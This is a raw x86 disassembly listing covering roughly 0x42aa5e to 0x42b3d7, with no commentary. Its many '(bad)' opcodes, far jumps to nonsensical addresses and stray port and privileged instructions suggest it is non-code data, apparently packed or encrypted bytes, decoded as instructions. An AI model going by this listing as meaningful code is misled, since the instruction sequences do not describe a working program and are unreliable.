  42aa5e:	adc    dl,BYTE PTR [esp+eax*8+0x577a394]
  42aa65:	mov    dl,0xfe
  42aa67:	jbe    0x42aa52
  42aa69:	mov    DWORD PTR [edi+0x30],ecx
  42aa6c:	test   DWORD PTR [eax-0xf0475a7],ebx
  42aa72:	mov    bh,al
  42aa74:	rcl    DWORD PTR [ebp+0x424d0f9d],1
  42aa7a:	dec    ebx
  42aa7b:	fstp   st(0)
  42aa7d:	sub    edi,ebx
  42aa7f:	push   cs
  42aa80:	adc    ch,0xac
  42aa83:	dec    ecx
  42aa84:	xor    bl,BYTE PTR [edi]
  42aa86:	mov    dh,0x6f
  42aa88:	lea    ecx,[edx+0x61]
  42aa8b:	repnz (bad) 
  42aa8d:	sbb    ah,bh
  42aa8f:	push   esi
  42aa90:	jb     0x42aafc
  42aa92:	ret    
  42aa93:	lock sbb DWORD PTR [esi+0x11],ebp
  42aa97:	int3   
  42aa98:	and    dl,BYTE PTR [edi-0x31]
  42aa9b:	pop    esi
  42aa9c:	sbb    ebp,DWORD PTR [ebx]
  42aa9e:	sbb    al,0x77
  42aaa0:	xchg   DWORD PTR [ebx-0x7a549a5a],ecx
  42aaa6:	or     DWORD PTR [ecx],ecx
  42aaa8:	mov    ds:0x93131168,al
  42aaad:	jl     0x42aa83
  42aaaf:	sbb    al,0x2e
  42aab1:	jmp    0x42aa4f
  42aab3:	pop    es
  42aab4:	out    0x5f,eax
  42aab6:	hlt    
  42aab7:	call   0x4251ca09
  42aabc:	push   eax
  42aabd:	cdq    
  42aabe:	push   esi
  42aabf:	mov    edx,DWORD PTR [edi]
  42aac1:	enter  0xd2aa,0x2a
  42aac5:	cmp    ch,bh
  42aac7:	out    0x82,al
  42aac9:	inc    ebp
  42aaca:	mov    BYTE PTR [ecx],dl
  42aacc:	jmp    0xa12e:0xedf13026
  42aad3:	mov    DWORD PTR [edi+0x5b],ebp
  42aad6:	xor    BYTE PTR [ecx-0x66],ch
  42aad9:	idiv   BYTE PTR cs:[eax+ebp*2-0x3d3aeacb]
  42aae1:	cmp    dl,BYTE PTR [esi+0x1c1b54b0]
  42aae7:	cdq    
  42aae8:	cli    
  42aae9:	in     al,0xb6
  42aaeb:	push   eax
  42aaec:	fdivr  DWORD PTR [ebx+0x68efb25f]
  42aaf2:	pop    edx
  42aaf3:	loope  0x42aa75
  42aaf5:	add    ebx,esi
  42aaf7:	mov    al,0x35
  42aaf9:	rol    dh,1
  42aafb:	push   ds
  42aafc:	jmp    0x42aa8d
  42aafe:	(bad)
  42ab01:	adc    ebp,edi
  42ab03:	in     al,0x8d
  42ab05:	xor    BYTE PTR [eax],ah
  42ab07:	fmul   QWORD PTR [ebp+0x256f1dca]
  42ab0d:	popf   
  42ab0e:	call   0x0:0xaf7f
	...
  42ab71:	add    BYTE PTR [eax],al
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	loope  0x42ab8b
  42ab82:	loope  0x42abed
  42ab84:	fwait
  42ab85:	leave  
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    eax,0xed000001
  42ab8d:	(bad)  
  42ab8e:	xchg   ebx,eax
  42ab8f:	aad    0x85
  42ab91:	xchg   DWORD PTR [ebx-0x76c66cef],esi
  42ab97:	mov    edx,0xa8fd9389
  42ab9c:	outs   dx,BYTE PTR ds:[esi]
  42ab9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ab9e:	fisub  DWORD PTR [esp+eax*1+0x33]
  42aba2:	into   
  42aba3:	xor    ebx,edx
  42aba5:	push   ecx
  42aba6:	push   ebp
  42aba7:	xchg   ebp,eax
  42aba8:	sahf   
  42aba9:	or     eax,0xdc9cf715
  42abae:	mov    eax,0x42facff5
  42abb3:	test   bl,bh
  42abb5:	call   0x2e4d5ec0
  42abba:	push   es
  42abbb:	popa   
  42abbc:	arpl   di,bp
  42abbe:	nop    DWORD PTR [ebp+0x57]
  42abc2:	out    dx,eax
  42abc3:	loopne 0x42abcc
  42abc5:	push   ebp
  42abc6:	and    dl,BYTE PTR [ebx]
  42abc8:	dec    eax
  42abc9:	cmp    dl,0x74
  42abcc:	outs   dx,DWORD PTR ds:[esi]
  42abcd:	jno    0x42ac1b
  42abcf:	mov    DWORD PTR [eax],eax
  42abd1:	ins    BYTE PTR es:[edi],dx
  42abd2:	jecxz  0x42ac4c
  42abd4:	jnp    0x42aba5
  42abd6:	mov    ah,0xe2
  42abd8:	xchg   edx,eax
  42abd9:	outs   dx,DWORD PTR ds:[esi]
  42abda:	xchg   esi,eax
  42abdb:	jmp    0xd1ea6a91
  42abe0:	and    cl,BYTE PTR [ebx+0x6364cbb6]
  42abe6:	xchg   DWORD PTR [edi-0x591f4173],edx
  42abec:	(bad)  
  42abed:	xor    edx,DWORD PTR [ebx+0x57]
  42abf0:	inc    ebp
  42abf1:	(bad)  
  42abf3:	or     ch,BYTE PTR [ebx+0x77f033fc]
  42abf9:	scas   eax,DWORD PTR es:[edi]
  42abfa:	push   cs
  42abfb:	xchg   ecx,eax
  42abfc:	repnz xchg edi,eax
  42abfe:	jns    0x42ab94
  42ac00:	xor    al,0xe5
  42ac02:	push   esi
  42ac03:	pop    ebp
  42ac04:	xor    al,0x8e
  42ac06:	dec    edx
  42ac07:	push   0x30892fe1
  42ac0c:	push   ebp
  42ac0d:	pop    ss
  42ac0e:	ss call 0xf8b6:0x484e1dbe
  42ac16:	mov    bl,0x4b
  42ac18:	mov    dl,BYTE PTR [ecx+0x5b]
  42ac1b:	cld    
  42ac1c:	imul   edi,DWORD PTR ds:0x6b8166eb,0x12
  42ac23:	cs jecxz 0x42ac0e
  42ac26:	mov    bh,BYTE PTR [edi-0x6bd1bfbb]
  42ac2c:	adc    esi,DWORD PTR [edx]
  42ac2e:	lods   eax,DWORD PTR ds:[esi]
  42ac2f:	and    ch,BYTE PTR ds:0x3f9107e2
  42ac35:	fdiv   st,st(7)
  42ac37:	les    esp,FWORD PTR [ebx-0x74deb9d4]
  42ac3d:	fucomp st(5)
  42ac3f:	jg     0x42acb1
  42ac41:	nop
  42ac42:	fwait
  42ac43:	aaa    
  42ac44:	pop    ss
  42ac45:	stos   BYTE PTR es:[edi],al
  42ac46:	cld    
  42ac47:	neg    DWORD PTR [ebx]
  42ac49:	iret   
  42ac4a:	data16 fild QWORD PTR ds:0x7339d417
  42ac51:	cli    
  42ac52:	(bad)
  42ac55:	rol    DWORD PTR [edx-0x62],0xba
  42ac59:	mov    eax,ds:0x35da95ab
  42ac5e:	test   BYTE PTR [ebx+esi*8],dl
  42ac61:	mov    eax,0xf82889b
  42ac66:	hlt    
  42ac67:	xor    dl,BYTE PTR [edi]
  42ac69:	adc    eax,0xea24d314
  42ac6e:	mov    dh,0xf6
  42ac70:	ins    BYTE PTR es:[edi],dx
  42ac71:	jae    0x42abf4
  42ac73:	out    dx,al
  42ac74:	jp     0x42ac61
  42ac76:	xor    BYTE PTR [ebx+0x57],al
  42ac79:	cmp    edi,DWORD PTR [edx-0x13]
  42ac7c:	add    dl,BYTE PTR ds:0x942221b2
  42ac82:	out    0xce,al
  42ac84:	scas   eax,DWORD PTR es:[edi]
  42ac85:	push   esp
  42ac86:	dec    eax
  42ac87:	fld    QWORD PTR [edx+0x50]
  42ac8a:	outs   dx,DWORD PTR ds:[esi]
  42ac8b:	dec    ebp
  42ac8c:	aam    0x4f
  42ac8e:	shl    BYTE PTR [eax],1
  42ac90:	xchg   edi,eax
	...
  42acf1:	add    BYTE PTR [eax],al
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	into   
  42ad01:	mov    ebp,0xcaa0723c
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    eax,0xf5000001
  42ad0d:	cdq    
  42ad0e:	jg     0x42ad0c
  42ad10:	mov    cs,WORD PTR [ecx]
  42ad12:	mov    dl,0xa4
  42ad14:	push   cs
  42ad15:	pop    ss
  42ad16:	mov    ch,0xc
  42ad18:	lock pushf 
  42ad1a:	jae    0x42ace3
  42ad1c:	and    al,0xf
  42ad1e:	lock out dx,eax
  42ad20:	sub    ebx,DWORD PTR [edi]
  42ad22:	call   0x295e:0x154311ea
  42ad29:	pushf  
  42ad2a:	cdq    
  42ad2b:	add    edi,0x11bd0d11
  42ad31:	push   ds
  42ad32:	jb     0x42ad61
  42ad34:	or     dl,bh
  42ad36:	inc    ecx
  42ad37:	cli    
  42ad38:	xchg   ebx,eax
  42ad39:	cmp    eax,0xade78257
  42ad3e:	leave  
  42ad3f:	jmp    0x42ad55
  42ad41:	add    edi,esi
  42ad43:	cmp    eax,DWORD PTR [edi-0x6331198b]
  42ad49:	jo     0x42ad5c
  42ad4b:	push   ebx
  42ad4c:	xor    BYTE PTR [esp],cl
  42ad4f:	cli    
  42ad50:	xlat   BYTE PTR ds:[ebx]
  42ad51:	xor    bl,BYTE PTR [esi+0x1f78c177]
  42ad57:	adc    al,0x9a
  42ad59:	mov    ebx,0xf3115df4
  42ad5e:	cmp    al,0x79
  42ad60:	or     al,0x4c
  42ad62:	stos   DWORD PTR es:[edi],eax
  42ad63:	and    DWORD PTR [ecx+edi*8-0x28],ebx
  42ad67:	call   0xb3000ed5
  42ad6c:	(bad)  
  42ad6d:	in     al,dx
  42ad6e:	loop   0x42adc6
  42ad70:	sbb    eax,0x4dc19a7a
  42ad75:	add    DWORD PTR [edi],edi
  42ad77:	sbb    ebx,DWORD PTR [esp+eax*1]
  42ad7a:	shl    DWORD PTR [esi+0x45],1
  42ad7d:	sbb    esi,DWORD PTR [edi-0x1c68656e]
  42ad83:	cmp    BYTE PTR [ecx],0x3a
  42ad86:	mov    ecx,0x73d01d65
  42ad8b:	(bad)  
  42ad8c:	scas   al,BYTE PTR es:[edi]
  42ad8d:	dec    eax
  42ad8e:	mov    dh,0x1f
  42ad90:	xchg   BYTE PTR [eax+ebp*1],dh
  42ad93:	fild   WORD PTR [esi]
  42ad95:	ins    DWORD PTR es:[edi],dx
  42ad96:	push   es
  42ad97:	and    DWORD PTR [edi-0x2de8e72d],edx
  42ad9d:	dec    ecx
  42ad9e:	inc    edx
  42ad9f:	pop    ebx
  42ada0:	sbb    esi,edi
  42ada2:	and    BYTE PTR [edi*1-0x2489a051],bl
  42ada9:	jns    0x42ae0f
  42adab:	call   0x60e5:0x4d05a7ef
  42adb2:	repnz bnd jnp 0x42ade6
  42adb6:	daa    
  42adb7:	pop    es
  42adb8:	stc    
  42adb9:	ret    0xea8e
  42adbc:	lods   eax,DWORD PTR ds:[esi]
  42adbd:	outs   dx,BYTE PTR ds:[esi]
  42adbe:	mov    esp,0xe943caef
  42adc3:	out    dx,al
  42adc4:	scas   al,BYTE PTR es:[edi]
  42adc5:	stos   BYTE PTR es:[edi],al
  42adc6:	xchg   edi,eax
  42adc7:	fld    TBYTE PTR [edi-0x1b]
  42adca:	dec    ebx
  42adcb:	ins    DWORD PTR es:[edi],dx
  42adcc:	test   eax,0x394f8ce0
  42add1:	or     BYTE PTR [ebx+ebp*8+0x69],0x66
  42add6:	bound  edx,QWORD PTR [ecx-0x7d]
  42add9:	addr16 (bad) 
  42addb:	stos   DWORD PTR es:[edi],eax
  42addc:	dec    ebp
  42addd:	sub    BYTE PTR [esi],al
  42addf:	std    
  42ade0:	pushf  
  42ade1:	mov    WORD PTR [edx-0x68],ss
  42ade4:	push   ss
  42ade5:	ds dec edi
  42ade7:	jmp    0xfd8e:0x3bf41af
  42adee:	xchg   ebp,eax
  42adef:	cmp    DWORD PTR [edx],edi
  42adf1:	fwait
  42adf2:	call   0x42b15c96
  42adf7:	int3   
  42adf8:	xlat   BYTE PTR ds:[ebx]
  42adf9:	and    edi,edi
  42adfb:	pop    ebx
  42adfc:	add    DWORD PTR [edi-0x52],eax
  42adff:	sbb    esi,DWORD PTR [edx]
  42ae01:	xchg   ecx,eax
  42ae02:	sar    BYTE PTR [edx+eiz*8+0x6f50671c],0x1b
  42ae0a:	push   eax
  42ae0b:	adc    eax,0xb54109b2
  42ae10:	add    DWORD PTR [eax],0x0
	...
  42ae72:	add    BYTE PTR [eax],al
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	je     0x42aed3
  42ae82:	test   eax,0x1cba578
  42ae87:	add    BYTE PTR ds:0x6b000001,al
  42ae8d:	sub    bh,ah
  42ae8f:	out    dx,al
  42ae90:	and    eax,0x14a3a66e
  42ae95:	jg     0x42ae41
  42ae97:	shl    DWORD PTR [ebx+0x26],1
  42ae9a:	ins    BYTE PTR es:[edi],dx
  42ae9b:	lods   al,BYTE PTR ds:[esi]
  42ae9c:	mov    ds:0x1dd68d0c,al
  42aea1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aea2:	add    eax,0x8f3de44c
  42aea7:	xlat   BYTE PTR ds:[ebx]
  42aea8:	(bad)
  42aeab:	sbb    al,0x1e
  42aead:	mov    esi,0x8ff13ba0
  42aeb2:	out    0xf4,eax
  42aeb4:	cmp    DWORD PTR [edx-0x5774eea4],edi
  42aeba:	cld    
  42aebb:	ret    
  42aebc:	inc    ebx
  42aebd:	clc    
  42aebe:	cmp    DWORD PTR [ebx],esi
  42aec0:	addr16 and eax,0x3a35bfb
  42aec6:	rcr    bl,0x43
  42aec9:	retf   0x187f
  42aecc:	ins    BYTE PTR es:[edi],dx
  42aecd:	aam    0x10
  42aecf:	je     0x42ae88
  42aed1:	add    BYTE PTR [ebp+0x11],ah
  42aed4:	in     eax,0x1e
  42aed6:	jb     0x42af12
  42aed8:	lea    ecx,[eax-0x565fbe6c]
  42aede:	push   ebp
  42aedf:	xchg   ecx,eax
  42aee0:	xor    BYTE PTR [eax-0x78],dh
  42aee3:	out    0x2f,al
  42aee5:	sub    bl,ah
  42aee7:	push   edx
  42aee8:	lock adc al,0x60
  42aeeb:	push   edx
  42aeec:	aaa    
  42aeed:	jp     0x42af07
  42aeef:	dec    ebp
  42aef0:	ror    DWORD PTR [esi-0x18],0xf
  42aef4:	pop    ebp
  42aef5:	push   ds
  42aef6:	retf   
  42aef7:	mov    BYTE PTR [eax+0x7b488a70],ah
  42aefd:	pop    es
  42aefe:	jmp    FWORD PTR [edx-0x18ae72da]
  42af04:	(bad)  
  42af05:	les    edi,FWORD PTR [ebp*2-0x3e32e9a0]
  42af0c:	ret    
  42af0d:	cmp    BYTE PTR [esp+eiz*8-0x7b1e33b8],dl
  42af14:	or     BYTE PTR ds:0x263a75f0,0x55
  42af1b:	push   ecx
  42af1c:	xchg   esi,eax
  42af1d:	loop   0x42af11
  42af1f:	mov    ecx,0xbba3a352
  42af24:	add    al,0xd1
  42af26:	lods   al,BYTE PTR ds:[esi]
  42af27:	inc    esi
  42af28:	xlat   BYTE PTR ds:[ebx]
  42af29:	cmp    DWORD PTR [ebx+0x40],ecx
  42af2c:	loop   0x42aeae
  42af2e:	adc    al,0xea
  42af30:	ds mov bh,0xb
  42af33:	loope  0x42af2f
  42af35:	(bad)  
  42af36:	xor    eax,0x7eb0f389
  42af3b:	cmp    edx,0x5ab216ed
  42af41:	adc    esi,ecx
  42af43:	xchg   edx,eax
  42af44:	fsub   DWORD PTR [ecx]
  42af46:	adc    al,0x0
  42af48:	scas   eax,DWORD PTR es:[edi]
  42af49:	xor    eax,0xedc94776
  42af4e:	xor    edi,ecx
  42af50:	inc    esi
  42af51:	data16 xlat BYTE PTR ds:[ebx]
  42af53:	mov    esp,0x94e5da6f
  42af58:	pop    eax
  42af59:	stos   DWORD PTR es:[edi],eax
  42af5a:	les    edx,FWORD PTR [eax+0xa]
  42af5d:	ss xchg edx,eax
  42af5f:	push   ss
  42af60:	adc    ebp,DWORD PTR [si-0x3548]
  42af65:	out    dx,eax
  42af66:	fndisi(8087 only) 
  42af68:	and    al,cl
  42af6a:	push   es
  42af6b:	aad    0x71
  42af6d:	add    eax,0x32d41e32
  42af72:	ret    
  42af73:	loopne 0x42af85
  42af75:	mov    dh,0x7e
  42af77:	int    0x7c
  42af79:	mov    ch,0x73
  42af7b:	and    esi,DWORD PTR [ebx+eax*8]
  42af7e:	sbb    ecx,0xc77b2ff0
  42af84:	or     dl,BYTE PTR [edx-0x4c90d0f7]
  42af8a:	daa    
  42af8b:	ja     0x42afad
  42af8d:	push   cs
  42af8e:	lods   eax,DWORD PTR ds:[esi]
  42af8f:	pusha  
  42af90:	dec    edx
	...
  42aff1:	add    BYTE PTR [eax],al
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	mov    BYTE PTR [edi+ecx*8-0x50],al
  42b004:	stos   BYTE PTR es:[edi],al
  42b005:	int3   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    eax,0xc7000001
  42b00d:	imul   esp,DWORD PTR [edx-0x58c961f7],0xffffffd0
  42b014:	loope  0x42b080
  42b016:	and    eax,0xb742334f
  42b01b:	repz fistp QWORD PTR [edi-0x6b5ee73c]
  42b022:	jb     0x42b060
  42b024:	push   edi
  42b025:	add    eax,esp
  42b027:	in     al,0x7a
  42b029:	cwde   
  42b02a:	nop
  42b02b:	clc    
  42b02c:	(bad)  
  42b02d:	or     DWORD PTR ds:0xf199f2cd,edi
  42b033:	inc    eax
  42b034:	inc    edx
  42b035:	sub    dh,ch
  42b037:	push   ecx
  42b038:	pop    ss
  42b039:	sbb    ebp,DWORD PTR [edi+0x1d]
  42b03c:	dec    ebp
  42b03d:	jae    0x42b01a
  42b03f:	aas    
  42b040:	aaa    
  42b041:	pop    ss
  42b042:	inc    esp
  42b043:	cmp    al,0x15
  42b045:	mov    cl,0xc3
  42b047:	sub    dh,cl
  42b049:	aad    0xca
  42b04b:	fistp  WORD PTR [esi]
  42b04d:	pushf  
  42b04e:	sbb    al,0x1c
  42b050:	mov    ch,0x3c
  42b052:	inc    ecx
  42b053:	inc    edi
  42b054:	pop    ebp
  42b055:	xor    al,0xaa
  42b057:	pop    ss
  42b058:	jb     0x42afea
  42b05a:	push   ebp
  42b05b:	jb     0x42b0a2
  42b05d:	fs cmp eax,0xb409fe39
  42b063:	popf   
  42b064:	xor    al,0xcf
  42b066:	pop    ebp
  42b067:	adc    BYTE PTR [ebp-0x4a224bf8],cl
  42b06d:	sti    
  42b06e:	inc    eax
  42b06f:	pushf  
  42b070:	adc    BYTE PTR [eax-0x72fff7b],dh
  42b076:	lods   al,BYTE PTR ds:[esi]
  42b077:	pop    es
  42b078:	sub    ah,BYTE PTR [esi]
  42b07a:	imul   DWORD PTR [ecx+0x40]
  42b07d:	cmc    
  42b07e:	add    esi,DWORD PTR [esp+eax*4-0xbfc11cd]
  42b085:	push   DWORD PTR [esi+0x4e3c0994]
  42b08b:	inc    DWORD PTR [esp+edi*8]
  42b08e:	and    BYTE PTR [ecx-0xa],bh
  42b091:	or     BYTE PTR [edx-0xc],0x0
  42b095:	jge    0x42b0d5
  42b097:	repz retf 
  42b099:	pop    ss
  42b09a:	inc    esi
  42b09b:	mov    esp,0x4a870c56
  42b0a0:	scas   eax,DWORD PTR es:[edi]
  42b0a1:	popa   
  42b0a2:	xchg   esp,eax
  42b0a3:	push   0x1
  42b0a5:	pop    ebx
  42b0a6:	adc    al,0x6a
  42b0a8:	retf   0x9cd2
  42b0ab:	out    0xbc,al
  42b0ad:	and    eax,DWORD PTR [edx-0x63]
  42b0b0:	mov    ah,0xdc
  42b0b2:	out    dx,eax
  42b0b3:	xlat   BYTE PTR ds:[ebx]
  42b0b4:	xor    esi,DWORD PTR [eax-0xc375934]
  42b0ba:	fcomp  QWORD PTR [ebx+0x3d]
  42b0bd:	fcomp  st(3)
  42b0bf:	cmp    DWORD PTR [edx+0x2b],esp
  42b0c2:	xor    ebp,DWORD PTR [ecx-0x43]
  42b0c5:	bound  ecx,QWORD PTR [ebp+0x105b4388]
  42b0cb:	(bad)  
  42b0cc:	bound  ebx,QWORD PTR [eax-0x568057f0]
  42b0d2:	adc    BYTE PTR [ebx+0x1f],dh
  42b0d5:	mov    dh,0x21
  42b0d7:	mov    ecx,0x9454d5eb
  42b0dc:	out    dx,al
  42b0dd:	shl    BYTE PTR [edi+0x7f],1
  42b0e0:	jae    0x42b0b3
  42b0e2:	mov    esp,0x8af84a3d
  42b0e7:	sub    DWORD PTR [esp+esi*2+0x1fe7e270],edx
  42b0ee:	retf   
  42b0ef:	test   eax,esp
  42b0f1:	nop
  42b0f2:	push   es
  42b0f3:	pop    edi
  42b0f4:	adc    eax,DWORD PTR [esi]
  42b0f6:	imul   edi,DWORD PTR [eax+0x1d],0x313fc126
  42b0fd:	adc    al,0x9a
  42b0ff:	neg    BYTE PTR [edx]
  42b101:	or     ebx,DWORD PTR [edi+0x55]
  42b104:	jno    0x42b0df
  42b106:	add    BYTE PTR [ecx+edi*2+0x65],cl
  42b10a:	nop
  42b10b:	pop    ebx
  42b10c:	and    eax,0x4f2c3e34
	...
  42b171:	add    BYTE PTR [eax],al
  42b173:	add    BYTE PTR [ebp+0x25],dh
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	push   esp
  42b181:	jns    0x42b185
  42b183:	or     DWORD PTR [edi+0x50001cd],ebp
  42b189:	add    DWORD PTR [eax],eax
  42b18b:	add    BYTE PTR [esp+eax*4+0x22],bh
  42b18f:	push   cs
  42b190:	ffree  st(2)
  42b192:	stos   BYTE PTR es:[edi],al
  42b193:	test   DWORD PTR [edx],ecx
  42b195:	popf   
  42b196:	xor    ch,BYTE PTR [eax-0x17]
  42b199:	mov    al,0x73
  42b19b:	xlat   BYTE PTR ds:[ebx]
  42b19c:	lods   eax,DWORD PTR ds:[esi]
  42b19d:	jb     0x42b1ab
  42b19f:	(bad)  
  42b1a0:	mov    esi,0xbd0a0863
  42b1a5:	comiss xmm0,xmm2
  42b1a8:	mov    ebp,0x76df12dd
  42b1ad:	pop    edx
  42b1ae:	pop    ebx
  42b1af:	pop    eax
  42b1b0:	imul   edi,DWORD PTR [esi-0x5d],0xffffff96
  42b1b4:	out    dx,eax
  42b1b5:	loopne 0x42b189
  42b1b7:	cwde   
  42b1b8:	adc    cl,ah
  42b1ba:	aaa    
  42b1bb:	mov    ecx,DWORD PTR [edi-0x46]
  42b1be:	jb     0x42b179
  42b1c0:	cmp    DWORD PTR [edi-0x51a811d9],esi
  42b1c6:	sub    BYTE PTR [ecx+ecx*4+0x46],0x62
  42b1cb:	sbb    eax,DWORD PTR [eax]
  42b1cd:	push   ds
  42b1ce:	adc    ebp,ebp
  42b1d0:	data16 mov bh,0xed
  42b1d3:	and    BYTE PTR [esi],ch
  42b1d5:	xchg   ecx,eax
  42b1d6:	cmp    BYTE PTR [edx+0x2c],bl
  42b1d9:	cmp    ah,BYTE PTR [edi]
  42b1db:	cmp    DWORD PTR [edx],esi
  42b1dd:	jmp    0x7625:0xabbe7a74
  42b1e4:	sub    ebx,DWORD PTR [ebp-0x7e]
  42b1e7:	sub    bl,BYTE PTR [eax+ebp*4-0x75]
  42b1eb:	xchg   edx,eax
  42b1ec:	enter  0xe369,0x32
  42b1f0:	add    ch,BYTE PTR [edi+0x48]
  42b1f3:	sti    
  42b1f4:	adc    DWORD PTR [ebp-0x34],ecx
  42b1f7:	(bad)  
  42b1f8:	and    DWORD PTR [ebp-0x2b87b459],ebx
  42b1fe:	into   
  42b1ff:	sbb    ebx,DWORD PTR [edx-0x21]
  42b202:	push   0xffffffd1
  42b204:	mov    dh,0xb0
  42b206:	mov    fs,WORD PTR [edx]
  42b208:	add    al,0xf3
  42b20a:	test   BYTE PTR [edx-0x2e],bh
  42b20d:	xchg   edx,eax
  42b20e:	xchg   ebp,eax
  42b20f:	and    BYTE PTR [eax+0x5c108723],bl
  42b215:	enter  0x3171,0x25
  42b219:	sbb    eax,0x4b5da63e
  42b21e:	imul   esp,DWORD PTR [edi-0x1],0x35643590
  42b225:	sbb    bh,BYTE PTR [edi]
  42b227:	sbb    DWORD PTR ss:[edx],0xffffffc2
  42b22b:	mov    eax,ds
  42b22d:	aas    
  42b22e:	ror    BYTE PTR [edx],1
  42b230:	in     al,0xe6
  42b232:	xchg   ebp,eax
  42b233:	cmp    al,0x2d
  42b235:	sub    ecx,esi
  42b237:	push   0xf34cc67a
  42b23c:	jp     0x42b2a9
  42b23e:	ds inc ebp
  42b240:	cmp    BYTE PTR [ebx-0x125fa853],dl
  42b246:	js     0x42b201
  42b248:	or     al,ah
  42b24a:	jbe    0x42b294
  42b24c:	push   edx
  42b24d:	inc    esp
  42b24e:	add    DWORD PTR [ecx+0x31],ecx
  42b251:	mov    ebp,0x5535c901
  42b256:	or     BYTE PTR [edx],dh
  42b258:	xor    edx,ebp
  42b25a:	xor    DWORD PTR [eax-0x33],esi
  42b25d:	ror    BYTE PTR [ebp+0x3f],cl
  42b260:	aas    
  42b261:	push   es
  42b262:	in     eax,0x5d
  42b264:	jb     0x42b28a
  42b266:	mov    ebp,0x9d6d0b9c
  42b26b:	fmul   QWORD PTR [ebx+0x2d49c4ca]
  42b271:	jg     0x42b26e
  42b273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b274:	repz sbb eax,0x93c3886b
  42b27a:	mov    ds:0x86866ed6,al
  42b27f:	mov    ecx,0xcb74b510
  42b284:	mov    ebp,0x6ae9a5be
  42b289:	jno    0x42b2d2
  42b28b:	dec    esp
  42b28c:	and    cl,BYTE PTR [esi-0x7c]
  42b28f:	bswap  ebp
	...
  42b2f1:	add    BYTE PTR [eax],al
  42b2f3:	add    BYTE PTR [ebp-0x449f6672],ah
  42b2f9:	ja     0x42b2f8
  42b2fb:	iret   
  42b2fc:	sub    eax,0x4c738e65
  42b301:	adc    dh,BYTE PTR [ecx+0x24]
  42b304:	mov    ah,0xce
  42b306:	add    DWORD PTR [eax],eax
  42b308:	add    eax,0xbe000001
  42b30d:	xchg   edx,eax
  42b30e:	call   0xf693:0x5ea876f2
  42b315:	cli    
  42b316:	aas    
  42b317:	fnstcw WORD PTR [ecx-0x4d]
  42b31a:	das    
  42b31b:	loop   0x42b34d
  42b31d:	jmp    0x69ab:0xda3e4896
  42b324:	cwde   
  42b325:	mov    ?,WORD PTR [edx+0xe]
  42b328:	mov    ch,0x5a
  42b32a:	mov    edx,0xf02f9a00
  42b32f:	mov    DWORD PTR [edi+0x70],ecx
  42b332:	mov    bh,0x97
  42b334:	sbb    BYTE PTR [ebp-0x428d7bd1],dh
  42b33a:	ret    
  42b33b:	add    al,0x49
  42b33d:	cmp    al,0x74
  42b33f:	xchg   esi,eax
  42b340:	mov    ch,0x18
  42b342:	xchg   ebp,eax
  42b343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b344:	inc    ebp
  42b345:	adc    ecx,DWORD PTR [ecx]
  42b347:	sbb    BYTE PTR [edx+eiz*8-0x3197bed5],cl
  42b34e:	jge    0x42b31a
  42b350:	push   esp
  42b351:	lahf   
  42b352:	enter  0x37a7,0x7d
  42b356:	add    al,0x1c
  42b358:	jns    0x42b3a5
  42b35a:	add    al,0xa
  42b35c:	scas   al,BYTE PTR es:[edi]
  42b35d:	cld    
  42b35e:	push   ecx
  42b35f:	pop    ds
  42b360:	iret   
  42b361:	nop
  42b362:	in     eax,0x5a
  42b364:	mov    dl,0x7
  42b366:	mov    dl,0xc3
  42b368:	jmp    0x42b3b9
  42b36a:	enter  0x648d,0x8a
  42b36e:	inc    eax
  42b36f:	xor    eax,0x51e6cc59
  42b374:	and    dh,ah
  42b376:	loopne 0x42b3e6
  42b378:	jmp    0x19c93120
  42b37d:	or     eax,0x599dee28
  42b382:	mov    esp,0x366f9c89
  42b387:	and    bh,al
  42b389:	dec    eax
  42b38a:	shl    ecx,cl
  42b38c:	sub    al,al
  42b38e:	jo     0x42b3eb
  42b390:	inc    ebx
  42b391:	dec    esi
  42b392:	and    al,0x26
  42b394:	lods   al,BYTE PTR ds:[esi]
  42b395:	out    0xec,eax
  42b397:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b399:	inc    esp
  42b39a:	mov    ebp,0x62a9cda0
  42b39f:	imul   ecx,DWORD PTR [ecx+0x1902d09d],0xffffffbd
  42b3a6:	cld    
  42b3a7:	int    0x61
  42b3a9:	scas   eax,DWORD PTR es:[edi]
  42b3aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b3ab:	(bad)  
  42b3ac:	sbb    eax,0xf2d3dea7
  42b3b1:	stos   BYTE PTR es:[edi],al
  42b3b2:	add    BYTE PTR [ebp+0x16],ch
  42b3b5:	scas   eax,DWORD PTR es:[edi]
  42b3b6:	jmp    0x8143:0xbfa8b5cd
  42b3bd:	aam    0x59
  42b3bf:	add    ebp,edx
  42b3c1:	or     bh,BYTE PTR [ebp+0x7]
  42b3c4:	inc    ecx
  42b3c5:	mov    ebp,0x3d0be57c
  42b3ca:	xchg   edx,eax
  42b3cb:	int3   
  42b3cc:	ins    BYTE PTR es:[edi],dx
  42b3cd:	sbb    ah,cl
  42b3cf:	dec    esp
  42b3d0:	mov    cl,0xfd
  42b3d2:	mov    edi,0x6c0c01
  42b3d7:	and    DWORD PTR [eax+0x2f],eax
